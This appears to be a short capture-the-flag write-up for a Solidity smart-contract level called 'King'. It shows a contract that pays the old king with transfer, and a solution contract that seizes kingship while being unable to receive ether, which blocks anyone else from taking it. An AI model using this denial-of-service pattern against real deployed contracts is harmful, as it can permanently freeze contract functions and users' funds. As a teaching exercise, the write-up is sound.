# Level 9 - King

### Objective

The objective of this level is as follows:

1. When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

### Contract

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
```

### Solution

In this level, we need to prevent the `king.transfer()` function from executing by making the current king a malicious contract that cannot receive any ether:

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract MiddleMan {
    function getKing(address payable _to) public payable {
        (bool sent, ) = _to.call.value(msg.value)("");
        require(sent, "Failure!");
    }
}
```

Once we deploy the `MiddleMan`, we call `getKing` with a some non-trivial value of ether (~1 Finney) with the level contract address.

Done!
